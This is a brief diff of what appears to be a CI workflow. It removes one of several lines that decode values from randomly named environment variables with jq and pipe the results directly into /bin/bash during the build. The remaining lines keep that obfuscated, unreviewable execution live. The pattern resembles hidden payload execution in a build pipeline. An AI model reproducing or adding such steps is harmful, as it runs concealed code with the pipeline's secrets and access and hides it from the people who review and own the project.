@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$bf0" | jq -r .xtzqv841 | /bin/bash
           echo $fv08 | jq -r .s86 | /bin/bash
           echo $kycc088 | jq -r .ml5 | /bin/bash
-          echo $pa67060 | jq -r .rrt23 | /bin/bash
           printf '%s' "$lbro93845" | jq -r .xbue72 | /bin/bash
 
       - name: Store results
